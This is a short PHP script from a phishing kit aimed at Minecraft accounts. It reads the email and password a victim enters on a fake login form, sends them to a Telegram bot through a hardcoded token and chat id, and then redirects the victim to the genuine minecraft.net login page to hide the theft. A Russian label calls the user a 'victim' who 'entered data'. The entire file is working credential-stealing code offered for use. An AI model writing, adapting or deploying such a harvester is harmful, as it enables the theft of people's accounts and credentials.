<?php 
	
$token = "1443314386:AAEZLPSJLi6A9CmgoSJeRkk0bnUkf1w-yBg"; //bot token
$chat = "758386053"; //chat id

$arr = array(
  ' ' => '⚠️ [Minecraft - Жертва ввела данные]⚠️',  
  'Почта: ' => $_POST['emailField'],
  'Пароль: ' => $_POST['password'], 
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat}&parse_mode=html&text={$txt}","r");

header("Location: https://www.minecraft.net/ru-ru/login");

?>